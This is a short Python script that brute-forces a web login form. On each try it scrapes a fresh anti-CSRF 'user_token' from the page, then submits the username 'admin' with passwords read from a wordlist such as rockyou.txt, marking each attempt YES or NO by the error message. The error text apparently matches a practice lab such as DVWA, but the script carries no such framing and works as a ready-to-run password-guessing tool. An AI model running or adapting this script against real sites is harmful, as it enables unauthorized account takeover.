import requests,bs4
import sys

args=sys.argv

#___i___i___i___i___i___i___i___i___i___i___i___i
#   URL: http
#   cookie :'cookie':'<>'
#   wordlist:ex)/usr/share/wordlist/rockyou.txt
#___i___i___i___i___i___i___i___i___i___i___i___i
def main(URL,cookie, wordlist):
    
    headers={
            'Cookie':cookie
            }
    passw=open(wordlist)
    pass_line = passw.readline()
    while pass_line:
        password=pass_line.strip()
        res = requests.get(URL,headers=headers)
        info = bs4.BeautifulSoup(res.text,'lxml')
        #print(password)
        #print(info.find('input',{'name':'user_token'}).get('value'))
        user_token = info.find('input',{'name':'user_token'}).get('value')
        ##
        #new request
        params={
                'username':'admin',
                'password':password,
                'user_token':user_token,
                'Login':'Login'
                }
        res2 = requests.get(URL,params=params,headers=headers)
        #print(res2.text)
        if 'Username and/or password incorrect.' in res2.text:
            print('TRY[{0}]:NO'.format(password))
        else:
            print('TRY[{0}]:YES'.format(password))
        pass_line = passw.readline()


if __name__=="__main__":

    main(args[1],args[2],args[3])

